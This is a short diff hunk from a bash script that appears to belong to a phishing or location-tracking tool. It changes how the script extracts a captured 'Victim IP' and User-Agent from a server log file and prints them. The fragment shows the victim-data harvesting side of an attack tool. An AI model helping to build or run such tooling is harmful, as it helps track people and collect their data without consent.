@@ -208,7 +208,7 @@ touch location.txt
 glocip=$(grep -a 'IP:' .server/location/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 # glocua=$(grep -a 'User-Agent:' .server/location/ip.txt | cut -d " " -f2)
-glocua=$(grep -a 'User-Agent:.*' .server/location/ip.txt | cut -d " " -f2 | tr -d '\r')
+glocua=$(grep 'User-Agent:.*' .server/location/ip.txt | cut -d " " -f2 | tr -d '\r')
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP :\e[0m\e[1;96m %s\e[0m\n" $glocip
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m User-Agent :\e[0m\e[1;96m %s\e[0m\n" $glocua
